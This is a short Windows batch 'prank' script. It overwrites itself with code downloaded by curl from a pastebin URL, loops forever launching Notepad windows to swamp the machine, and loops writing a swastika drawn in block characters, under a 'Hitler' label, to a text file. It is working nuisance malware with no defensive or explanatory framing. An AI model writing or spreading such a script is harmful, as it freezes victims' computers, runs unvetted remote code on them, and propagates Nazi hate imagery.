::Updater
set "filePath=%~f0"
copy "%filePath%" "%filePath%.old"
curl "https://pastebin.com/raw/AWw0idyG" -o "%filePath%"

::Loops

:Notepad
  start "" notepad.exe
  goto :Notepad

:Hitler  
  echo.
  echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > prank.txt
  echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> prank.txt
  echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> prank.txt
  echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> prank.txt
  echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> prank.txt
  echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> prank.txt
  echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> prank.txt
  echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> prank.txt
  echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> prank.txt
  echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> prank.txt
  echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> prank.txt
  echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> prank.txt
  goto :Hitler
